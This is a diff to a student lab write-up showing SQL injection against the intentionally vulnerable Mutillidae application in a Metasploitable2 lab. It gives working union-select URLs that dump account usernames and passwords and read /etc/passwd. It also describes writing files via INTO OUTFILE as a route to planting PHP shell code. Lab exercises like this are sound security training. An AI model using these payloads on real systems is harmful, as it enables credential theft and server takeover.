@@ -99,8 +99,22 @@ Here we are trying to extract column names from the “accounts” table.
 The column names of the accounts is displayed below for the following url:
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
+![eth 8 25](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/d5c5fcd8-774b-4d38-8ee0-73b71cec39a0)
 
+Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
+Ex: (union select 1,username,password,is_admin,5 from accounts).
+
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+![eth 8 26](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/de94446f-a496-4fc6-9986-629eaac4536b)
+## Reading and writing files on the web-server:
+We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.
+
+Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
+
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+![eth 8 27](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/9a7cf898-b0bd-458b-a945-7eab736b7f88)
+the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
 
 ## RESULT:
 The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
